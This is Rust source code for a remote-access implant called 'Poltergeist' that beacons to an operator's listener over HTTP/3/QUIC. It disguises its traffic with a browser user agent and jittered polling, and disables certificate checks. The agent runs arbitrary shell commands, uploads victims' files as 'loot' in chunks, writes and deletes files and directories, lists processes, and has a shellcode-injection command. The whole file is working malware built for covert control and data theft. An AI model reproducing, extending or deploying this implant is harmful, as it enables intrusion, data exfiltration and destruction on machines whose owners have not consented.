mod obfuscate;
mod inject;

use std::collections::HashMap;
use std::env;
use std::fs;
use std::path::Path;
use std::process::Command as ProcessCommand;
use std::sync::Arc;
use std::time::Duration;

use base64::{engine::general_purpose, Engine as _};
use bytes::{Buf, Bytes};
use h3_quinn::Connection;
use hmac::{Hmac, Mac};
use http::{Method, Request, Uri};
use quinn::{ClientConfig, Endpoint};
use rand::Rng;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use sha2::Sha256;
use std::time::{SystemTime, UNIX_EPOCH};
use tokio::sync::Mutex;
use uuid::Uuid;

type HmacSha256 = Hmac<Sha256>;

// Build-time configuration (set via build script environment variables or defaults)
macro_rules! env_or_default {
    ($env:expr, $default:expr) => {
        match option_env!($env) {
            Some(v) if !v.is_empty() => v,
            _ => $default,
        }
    };
}

const LISTENER_HOST: &str = env_or_default!("POLTERGEIST_HOST", "localhost");
const LISTENER_PORT: &str = env_or_default!("POLTERGEIST_PORT", "8081");
const LISTENER_ENDPOINT: &str = env_or_default!("POLTERGEIST_ENDPOINT", "/wiki");
const HMAC_KEY_HEX: &str = env_or_default!("POLTERGEIST_HMAC_KEY", "29b3249406c7185cd1bedc33c9b32acd147244bd87ebd9c83e7fc6692da2c4ce");
const RECONNECT_INTERVAL: u64 = 15; // Set via build or default
const JITTER_SECONDS: u64 = 10; // Set via build or default
const USER_AGENT: &str = env_or_default!("POLTERGEIST_USER_AGENT", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

// Constants
const CHUNK_SIZE: usize = 2 * 1024 * 1024; // 2MB chunks
const CHUNK_THRESHOLD: u64 = 10 * 1024 * 1024; // 10MB threshold

#[derive(Debug, Clone, Serialize, Deserialize)]
struct AgentRegistration {
    uuid: String,
    name: String,
    ip: String,
    os: String,
    #[serde(rename = "reconnectInterval")]
    reconnect_interval: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct Command {
    id: i32,
    #[serde(rename = "agentId")]
    agent_id: String,
    command: String,
    #[serde(rename = "clientUsername")]
    client_username: String,
    status: String,
    output: String,
    #[serde(rename = "createdAt")]
    created_at: String,
    #[serde(rename = "executedAt")]
    executed_at: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct CommandResponse {
    #[serde(rename = "commandId")]
    command_id: i32,
    output: String,
    status: String,
}

#[derive(Debug, Clone)]
struct AgentState {
    agent_id: String,
    reconnect_interval: u64,
    jitter_seconds: u64,
    current_command_id: i32,
    hmac_key: Vec<u8>,
}

impl AgentState {
    fn new() -> Self {
        // Use the hex string as raw bytes, just like Go's []byte(hmacKeyHex)
        let hmac_key = HMAC_KEY_HEX.as_bytes().to_vec();
        
        // Parse intervals from environment or use defaults
        let reconnect_interval = option_env!("POLTERGEIST_INTERVAL")
            .and_then(|v| v.parse::<u64>().ok())
            .unwrap_or(RECONNECT_INTERVAL);
        let jitter_seconds = option_env!("POLTERGEIST_JITTER")
            .and_then(|v| v.parse::<u64>().ok())
            .unwrap_or(JITTER_SECONDS);
        
        Self {
            agent_id: Uuid::new_v4().to_string(),
            reconnect_interval,
            jitter_seconds,
            current_command_id: 0,
            hmac_key,
        }
    }
}

// HMAC signing functions
fn generate_hmac(message: &str, key: &[u8]) -> String {
    let mut mac = HmacSha256::new_from_slice(key).expect("HMAC can take key of any size");
    mac.update(message.as_bytes());
    hex::encode(mac.finalize().into_bytes())
}

fn sign_request(method: &str, path: &str, body: &str, key: &[u8]) -> (String, String) {
    let timestamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_secs()
        .to_string();
    let message = format!("{}{}{}{}", method, path, timestamp, body);
    let signature = generate_hmac(&message, key);
    (timestamp, signature)
}

// Helper: wrap data with HMAC signature
fn wrap_with_hmac(data: &Value, key: &[u8]) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let json_data = serde_json::to_string(data)?;
    let (timestamp, signature) = sign_request("POST", LISTENER_ENDPOINT, &json_data, key);

    // Use json_data as RawValue to preserve exact bytes that were signed
    let wrapper = json!({
        "data": serde_json::value::RawValue::from_string(json_data)?,
        "timestamp": timestamp,
        "signature": signature,
    });

    Ok(serde_json::to_vec(&wrapper)?)
}

// Send HTTP/3 request over QUIC
async fn send_quic_request(
    endpoint: &Endpoint,
    path: &str,
    data: &[u8],
    headers: HashMap<String, String>,
) -> Result<Value, Box<dyn std::error::Error>> {
    // Resolve hostname to address
    let addr_str = format!("{}:{}", LISTENER_HOST, LISTENER_PORT);
    let server_addr = tokio::net::lookup_host(&addr_str)
        .await?
        .find(|addr| addr.is_ipv4())
        .ok_or("Failed to resolve hostname")?;

    // Connect QUIC
    let quinn_conn = endpoint.connect(server_addr, LISTENER_HOST)?.await?;
    
    // Wrap in h3 connection
    let h3_conn = Connection::new(quinn_conn);
    let (mut driver, mut send_request) = h3::client::new(h3_conn).await?;
    
    // Spawn driver
    tokio::spawn(async move {
        let _ = driver.wait_idle().await;
    });

    // Build URI
    let uri: Uri = format!("https://{}:{}{}", LISTENER_HOST, LISTENER_PORT, path)
        .parse()?;

    // Build request
    let mut req = Request::builder()
        .method(Method::POST)
        .uri(uri)
        .header("user-agent", USER_AGENT)
        .header("content-type", "application/json");

    // Add custom headers
    for (key, value) in headers {
        req = req.header(key, value);
    }

    let req = req.body(())?;

    // Send request
    let mut stream = send_request.send_request(req).await?;
    stream.send_data(Bytes::copy_from_slice(data)).await?;
    stream.finish().await?;

    // Receive response
    let resp = stream.recv_response().await?;
    let status = resp.status().as_u16();

    // Read body
    let mut body = Vec::new();
    while let Some(mut chunk) = stream.recv_data().await? {
        body.extend_from_slice(chunk.chunk());
        chunk.advance(chunk.remaining());
    }

    let body_str = String::from_utf8_lossy(&body);

    Ok(json!({
        "status": status,
        "body": body_str
    }))
}

// Register agent
async fn register_agent(
    endpoint: &Endpoint,
    state: &AgentState,
) -> Result<(), Box<dyn std::error::Error>> {
    let reg = AgentRegistration {
        uuid: state.agent_id.clone(),
        name: format!("Agent-{}", &state.agent_id[..8]),
        ip: get_local_ip(),
        os: get_os_info(),
        reconnect_interval: state.reconnect_interval,
    };

    let data = wrap_with_hmac(&serde_json::to_value(&reg)?, &state.hmac_key)?;

    let response = send_quic_request(endpoint, LISTENER_ENDPOINT, &data, HashMap::new()).await?;

    if response["status"] != 200 {
        return Err("Registration failed".into());
    }

    Ok(())
}

// Get pending commands
async fn get_pending_commands(
    endpoint: &Endpoint,
    state: &AgentState,
) -> Result<Vec<Command>, Box<dyn std::error::Error>> {
    let poll_request = json!({ "agentId": state.agent_id });
    let data = wrap_with_hmac(&poll_request, &state.hmac_key)?;

    let response = send_quic_request(endpoint, LISTENER_ENDPOINT, &data, HashMap::new()).await?;

    if response["status"] != 200 {
        return Ok(vec![]);
    }

    let body: Value = serde_json::from_str(response["body"].as_str().unwrap_or("{}"))?;
    let commands: Vec<Command> = serde_json::from_value(body["commands"].clone())?;

    Ok(commands)
}

// Send command response
async fn send_command_response(
    endpoint: &Endpoint,
    state: &AgentState,
    command_id: i32,
    output: String,
    status: String,
) -> Result<(), Box<dyn std::error::Error>> {
    let response = CommandResponse {
        command_id,
        output: output.clone(),
        status,
    };

    let mut headers = HashMap::new();
    if output.contains("LOOT_ENTRIES:") {
        headers.insert("type".to_string(), "loot".to_string());
    }

    let data = wrap_with_hmac(&serde_json::to_value(&response)?, &state.hmac_key)?;

    send_quic_request(endpoint, LISTENER_ENDPOINT, &data, headers).await?;
    Ok(())
}

// Execute command
async fn execute_command(cmd: &str, state: &mut AgentState, endpoint: &Endpoint) -> Result<String, Box<dyn std::error::Error>> {
    let parts: Vec<&str> = cmd.trim().split_whitespace().collect();
    if parts.is_empty() {
        return Err("Empty command".into());
    }

    let args: Vec<String> = parts[1..].iter().map(|s| s.to_string()).collect();

    match parts[0] {
        "ls" => handle_ls(&args).await,
        "get" => handle_get(&args, state, endpoint).await,
        "put" => handle_put(&args).await,
        "cd" => handle_cd(&args).await,
        "kill" => handle_kill(&args).await,
        "ps" => handle_ps(&args).await,
        "exec" => handle_exec(&args).await,
        "reconnect" => handle_reconnect(&args, state).await,
        "rm" => handle_rm(&args).await,
        "rmdir" => handle_rmdir(&args).await,
        "jitter" => handle_jitter(&args, state).await,
        "injectsc" => Ok(inject::handle_inject_sc(&args)?),
        _ => exec_system_command(cmd).await,
    }
}

// Platform-specific command execution
async fn exec_system_command(cmd: &str) -> Result<String, Box<dyn std::error::Error>> {
    #[cfg(windows)]
    let output = ProcessCommand::new("cmd").args(&["/C", cmd]).output()?;

    #[cfg(unix)]
    let output = ProcessCommand::new("sh").args(&["-c", cmd]).output()?;

    Ok(String::from_utf8_lossy(&output.stdout).to_string()
        + &String::from_utf8_lossy(&output.stderr).to_string())
}

// Command handlers
async fn handle_ls(args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
    let path = args.first().map(|s| s.as_str()).unwrap_or(".");
    
    // Get absolute path first
    let abs_path = fs::canonicalize(path)?;
    let abs_path_str = clean_path(&abs_path);
    
    let entries = fs::read_dir(&abs_path)?;

    let mut result = format!("📁 {}\n", abs_path_str);
    let mut loot_entries = Vec::new();

    for entry in entries {
        let entry = entry?;
        let metadata = entry.metadata()?;
        let name = entry.file_name().to_string_lossy().to_string();
        
        // Build full path by joining abs_path with entry name
        let full_path = abs_path.join(&name);
        let full_path_str = clean_path(&full_path);

        if metadata.is_dir() {
            result.push_str(&format!("├── 📁 {}/\n", name));
            loot_entries.push(json!({
                "type": "directory",
                "path": full_path_str,
                "name": name,
                "size": 0,
            }));
        } else {
            let size = metadata.len();
            result.push_str(&format!("├── 📄 {} ({})\n", name, format_file_size(size)));
            loot_entries.push(json!({
                "type": "file",
                "path": full_path_str,
                "name": name,
                "size": size,
            }));
        }
    }

    if !loot_entries.is_empty() {
        result.push_str(&format!("\nLOOT_ENTRIES:{}", serde_json::to_string(&loot_entries)?));
    }

    Ok(result)
}

async fn handle_get(args: &[String], state: &AgentState, endpoint: &Endpoint) -> Result<String, Box<dyn std::error::Error>> {
    if args.is_empty() {
        return Err("usage: get <filepath>".into());
    }

    let path = Path::new(&args[0]);
    let metadata = fs::metadata(path)?;
    let file_size = metadata.len();

    if file_size < CHUNK_THRESHOLD {
        handle_get_small_file(path).await
    } else {
        handle_get_chunked_file(path, state, endpoint).await
    }
}

async fn handle_get_small_file(path: &Path) -> Result<String, Box<dyn std::error::Error>> {
    let content = fs::read(path)?;
    let hash = format!("{:x}", md5::compute(&content));
    let filename = path.file_name().unwrap().to_string_lossy();

    let loot_entry = json!({
        "type": "file",
        "name": filename,
        "path": clean_path(path),
        "size": content.len(),
        "content": general_purpose::STANDARD.encode(&content),
        "md5": hash,
    });

    Ok(format!("got {}!\nLOOT_ENTRIES:{}", filename, serde_json::to_string(&vec![loot_entry])?))
}

async fn handle_get_chunked_file(path: &Path, state: &AgentState, endpoint: &Endpoint) -> Result<String, Box<dyn std::error::Error>> {
    let content = fs::read(path)?;
    let file_size = content.len() as u64;
    let filename = path.file_name().unwrap().to_string_lossy().to_string();
    
    let total_chunks = (file_size as usize + CHUNK_SIZE - 1) / CHUNK_SIZE;
    let expected_md5 = format!("{:x}", md5::compute(&content));

    // Initiate chunked transfer session
    let session_id = initiate_chunked_transfer(
        endpoint,
        state,
        clean_path(path),
        filename.clone(),
        file_size,
        total_chunks,
        expected_md5.clone(),
    ).await?;

    // Upload each chunk
    for i in 0..total_chunks {
        let start = i * CHUNK_SIZE;
        let end = ((i + 1) * CHUNK_SIZE).min(content.len());
        let chunk_data = &content[start..end];
        let chunk_md5 = format!("{:x}", md5::compute(chunk_data));

        upload_chunk(endpoint, state, &session_id, i, chunk_data, &chunk_md5).await?;
    }

    // Complete the transfer
    complete_chunked_transfer(endpoint, state, &session_id).await?;

    Ok(format!(
        "got {}! ({} bytes in {} chunks, md5={})",
        filename, file_size, total_chunks, expected_md5
    ))
}

// Initiate chunked transfer session
async fn initiate_chunked_transfer(
    endpoint: &Endpoint,
    state: &AgentState,
    original_path: String,
    filename: String,
    total_size: u64,
    total_chunks: usize,
    expected_md5: String,
) -> Result<String, Box<dyn std::error::Error>> {
    
    let init_req = json!({
        "agentId": state.agent_id,
        "commandId": state.current_command_id,
        "filename": filename,
        "originalPath": original_path,
        "totalSize": total_size,
        "totalChunks": total_chunks,
        "expectedMd5": expected_md5,
    });

    let data = wrap_with_hmac(&init_req, &state.hmac_key)?;

    let response = send_quic_request(&endpoint, LISTENER_ENDPOINT, &data, HashMap::new()).await?;
    let result = if response["body"].is_string() {
        serde_json::from_str(response["body"].as_str().unwrap())?
    } else {
        response["body"].clone()
    };

    let session_id = result["sessionId"]
        .as_str()
        .ok_or("No session ID in response")?
        .to_string();

    Ok(session_id)
}

// Upload a single chunk
async fn upload_chunk(
    endpoint: &Endpoint,
    state: &AgentState,
    session_id: &str,
    chunk_index: usize,
    chunk_data: &[u8],
    chunk_md5: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    let chunk_req = json!({
        "sessionId": session_id,
        "chunkIndex": chunk_index,
        "chunkData": general_purpose::STANDARD.encode(chunk_data),
        "chunkMd5": chunk_md5,
    });

    let data = wrap_with_hmac(&chunk_req, &state.hmac_key)?;

    send_quic_request(endpoint, LISTENER_ENDPOINT, &data, HashMap::new()).await?;
    Ok(())
}

// Complete chunked transfer
async fn complete_chunked_transfer(
    endpoint: &Endpoint,
    state: &AgentState,
    session_id: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    let complete_req = json!({
        "sessionId": session_id,
        "complete": true,
    });

    let data = wrap_with_hmac(&complete_req, &state.hmac_key)?;

    send_quic_request(endpoint, LISTENER_ENDPOINT, &data, HashMap::new()).await?;
    Ok(())
}

async fn handle_put(args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
    if args.len() < 2 {
        return Err("usage: put <filepath> <hex_data>".into());
    }

    let path = &args[0];
    let hex_data = args[1].trim_matches('"');
    let file_data = hex::decode(hex_data)?;

    // Create parent directory if it doesn't exist
    let path_obj = Path::new(path);
    if let Some(parent) = path_obj.parent() {
        fs::create_dir_all(parent)?;
    }

    // Write file
    fs::write(path, &file_data)?;

    let hash = format!("{:x}", md5::compute(&file_data));
    let filename = path_obj.file_name().unwrap().to_string_lossy();
    let full_path = clean_path(&fs::canonicalize(path_obj)?);

    let loot_entry = json!({
        "type": "file",
        "name": filename,
        "path": full_path,
        "size": file_data.len(),
        "md5": hash,
    });

    Ok(format!("put {}!\nLOOT_ENTRIES:{}", filename, serde_json::to_string(&vec![loot_entry])?))
}

async fn handle_cd(args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
    if args.is_empty() {
        let cwd = env::current_dir()?;
        return Ok(clean_path(&cwd));
    }

    env::set_current_dir(&args[0])?;
    let new_cwd = env::current_dir()?;
    Ok(format!("Changed directory to: {}", clean_path(&new_cwd)))
}

async fn handle_kill(_args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
    tokio::spawn(async {
        tokio::time::sleep(Duration::from_secs(1)).await;
        std::process::exit(0);
    });
    Ok("Agent terminating...".to_string())
}

async fn handle_ps(_args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
    #[cfg(windows)]
    return get_windows_processes();

    #[cfg(unix)]
    return exec_system_command("ps aux").await;
}

#[cfg(windows)]
fn get_windows_processes() -> Result<String, Box<dyn std::error::Error>> {
    use windows::Win32::System::Diagnostics::ToolHelp::*;
    use windows::Win32::Foundation::*;

    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)?;
        let mut entry = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            ..Default::default()
        };

        let mut result = String::from("PID\tName\t\tParent\n---\t----\t\t------\n");

        if Process32FirstW(snapshot, &mut entry).is_ok() {
            loop {
                let name = String::from_utf16_lossy(&entry.szExeFile)
                    .trim_end_matches('\0')
                    .to_string();
                result.push_str(&format!(
                    "{}\t{}\t\t{}\n",
                    entry.th32ProcessID, name, entry.th32ParentProcessID
                ));

                if Process32NextW(snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }

        let _ = CloseHandle(snapshot);
        Ok(result)
    }
}

async fn handle_exec(args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
    if args.is_empty() {
        return Err("usage: exec <command>".into());
    }
    exec_system_command(&args.join(" ")).await
}

async fn handle_reconnect(args: &[String], state: &mut AgentState) -> Result<String, Box<dyn std::error::Error>> {
    if args.is_empty() {
        return Ok(format!(
            "Current reconnect interval: {} seconds\nUsage: reconnect <seconds>",
            state.reconnect_interval
        ));
    }

    let new_interval: u64 = args[0].parse()?;
    if new_interval < 5 || new_interval > 3600 {
        return Err("interval must be between 5 and 3600 seconds".into());
    }

    let old_interval = state.reconnect_interval;
    state.reconnect_interval = new_interval;
    Ok(format!(
        "Reconnect interval changed from {} to {} seconds",
        old_interval, new_interval
    ))
}

async fn handle_rm(args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
    if args.is_empty() {
        return Err("usage: rm <filepath>".into());
    }

    let path = Path::new(&args[0]);
    if path.is_dir() {
        return Err("cannot remove directory with rm (use rmdir)".into());
    }

    fs::remove_file(path)?;
    Ok(format!("Removed file: {}", clean_path(path)))
}

async fn handle_rmdir(args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
    if args.is_empty() {
        return Err("usage: rmdir <dirpath>".into());
    }

    let path = Path::new(&args[0]);
    if !path.is_dir() {
        return Err("not a directory (use rm for files)".into());
    }

    fs::remove_dir_all(path)?;
    Ok(format!("Removed directory: {}", clean_path(path)))
}

async fn handle_jitter(args: &[String], state: &mut AgentState) -> Result<String, Box<dyn std::error::Error>> {
    if args.is_empty() {
        return Ok(format!(
            "Current jitter: +/- {} seconds\nUsage: jitter <seconds>",
            state.jitter_seconds
        ));
    }

    let new_jitter: u64 = args[0].parse()?;
    if new_jitter > 300 {
        return Err("jitter too large (maximum: 300 seconds)".into());
    }

    let old_jitter = state.jitter_seconds;
    state.jitter_seconds = new_jitter;
    Ok(format!(
        "Jitter changed from +/- {} to +/- {} seconds",
        old_jitter, new_jitter
    ))
}

// Helper functions
fn clean_path(path: &Path) -> String {
    let path_str = path.display().to_string();
    // Strip Windows extended-length path prefix
    if path_str.starts_with(r"\\?\") {
        path_str[4..].to_string()
    } else {
        path_str
    }
}

fn get_local_ip() -> String {
    // Get the real local IP by checking which interface would route to the internet
    // This doesn't actually send any data, just queries the routing table
    use std::net::UdpSocket;
    
    match UdpSocket::bind("0.0.0.0:0") {
        Ok(socket) => {
            // Try to "connect" to Google DNS (doesn't send data)
            match socket.connect("8.8.8.8:80") {
                Ok(_) => {
                    match socket.local_addr() {
                        Ok(addr) => addr.ip().to_string(),
                        Err(_) => "unknown".to_string(),
                    }
                }
                Err(_) => "unknown".to_string(),
            }
        }
        Err(_) => "unknown".to_string(),
    }
}

fn get_os_info() -> String {
    format!("{} {}", std::env::consts::OS, std::env::consts::ARCH)
}

fn format_file_size(size: u64) -> String {
    const UNITS: &[&str] = &["B", "KB", "MB", "GB", "TB"];
    let mut size = size as f64;
    let mut unit_index = 0;

    while size >= 1024.0 && unit_index < UNITS.len() - 1 {
        size /= 1024.0;
        unit_index += 1;
    }

    format!("{:.1}{}", size, UNITS[unit_index])
}

fn calculate_interval_with_jitter(base: u64, jitter: u64) -> u64 {
    if jitter == 0 {
        return base;
    }

    let mut rng = rand::thread_rng();
    let jitter_amount = rng.gen_range(0..=(jitter * 2)) as i64 - jitter as i64;
    let interval = base as i64 + jitter_amount;

    interval.max(1) as u64
}

// Create QUIC endpoint
async fn create_quic_endpoint() -> Result<Endpoint, Box<dyn std::error::Error>> {
    let mut client_crypto = rustls::ClientConfig::builder()
        .dangerous()
        .with_custom_certificate_verifier(Arc::new(SkipServerVerification))
        .with_no_client_auth();

    client_crypto.alpn_protocols = vec![b"h3".to_vec()];

    let client_config = ClientConfig::new(Arc::new(
        quinn::crypto::rustls::QuicClientConfig::try_from(client_crypto)?,
    ));

    let mut endpoint = Endpoint::client("0.0.0.0:0".parse()?)?;
    endpoint.set_default_client_config(client_config);

    Ok(endpoint)
}

// Skip TLS verification for self-signed certs
#[derive(Debug)]
struct SkipServerVerification;

impl rustls::client::danger::ServerCertVerifier for SkipServerVerification {
    fn verify_server_cert(
        &self,
        _end_entity: &rustls::pki_types::CertificateDer<'_>,
        _intermediates: &[rustls::pki_types::CertificateDer<'_>],
        _server_name: &rustls::pki_types::ServerName<'_>,
        _ocsp_response: &[u8],
        _now: rustls::pki_types::UnixTime,
    ) -> Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
        Ok(rustls::client::danger::ServerCertVerified::assertion())
    }

    fn verify_tls12_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn verify_tls13_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
        vec![
            rustls::SignatureScheme::RSA_PKCS1_SHA1,
            rustls::SignatureScheme::ECDSA_SHA1_Legacy,
            rustls::SignatureScheme::RSA_PKCS1_SHA256,
            rustls::SignatureScheme::ECDSA_NISTP256_SHA256,
            rustls::SignatureScheme::RSA_PKCS1_SHA384,
            rustls::SignatureScheme::ECDSA_NISTP384_SHA384,
            rustls::SignatureScheme::RSA_PKCS1_SHA512,
            rustls::SignatureScheme::ECDSA_NISTP521_SHA512,
            rustls::SignatureScheme::RSA_PSS_SHA256,
            rustls::SignatureScheme::RSA_PSS_SHA384,
            rustls::SignatureScheme::RSA_PSS_SHA512,
            rustls::SignatureScheme::ED25519,
            rustls::SignatureScheme::ED448,
        ]
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let state = AgentState::new();

    // Initial jitter
    if state.jitter_seconds > 0 {
        let initial_jitter = rand::thread_rng().gen_range(0..=state.jitter_seconds);
        tokio::time::sleep(Duration::from_secs(initial_jitter)).await;
    }

    let endpoint = create_quic_endpoint().await?;

    // Registration loop
    loop {
        match register_agent(&endpoint, &state).await {
            Ok(_) => break,
            Err(e) => {
                eprintln!("Registration failed: {}", e);
                tokio::time::sleep(Duration::from_secs(state.reconnect_interval)).await;
            }
        }
    }

    println!("Agent registered: {}", state.agent_id);

    // Command polling loop
    let state = Arc::new(Mutex::new(state));
    loop {
        let interval = {
            let state_guard = state.lock().await;
            calculate_interval_with_jitter(
                state_guard.reconnect_interval,
                state_guard.jitter_seconds,
            )
        };

        tokio::time::sleep(Duration::from_secs(interval)).await;

        let commands = {
            let state_guard = state.lock().await;
            match get_pending_commands(&endpoint, &state_guard).await {
                Ok(cmds) => cmds,
                Err(_) => continue,
            }
        };

        for cmd in commands {
            if cmd.status == "pending" {
                let mut state_guard = state.lock().await;
                state_guard.current_command_id = cmd.id;

                let output = match execute_command(&cmd.command, &mut state_guard, &endpoint).await {
                    Ok(out) => out,
                    Err(e) => format!("Error: {}", e),
                };

                let _ = send_command_response(
                    &endpoint,
                    &state_guard,
                    cmd.id,
                    output,
                    "completed".to_string(),
                )
                .await;
            }
        }
    }
}

